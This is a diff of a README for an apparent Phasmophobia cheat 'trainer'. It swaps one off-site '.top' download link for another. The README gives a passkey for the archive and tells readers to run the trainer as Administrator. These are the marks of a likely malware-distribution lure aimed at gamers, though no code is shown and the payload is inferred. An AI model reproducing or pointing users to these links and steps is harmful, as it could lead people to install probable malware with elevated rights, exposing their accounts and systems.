@@ -6,7 +6,7 @@ Phasmophobia trainer with ESP wallhack, infinite sanity, speed hack, no ghost ag
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top)**
 
 Archive passkey: `Github`
 
@@ -74,7 +74,7 @@ Archive passkey: `Github`
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top)** to download.
 2. Extract the archive.
 3. Launch Phasmophobia.
 4. Run the trainer **as Administrator**.
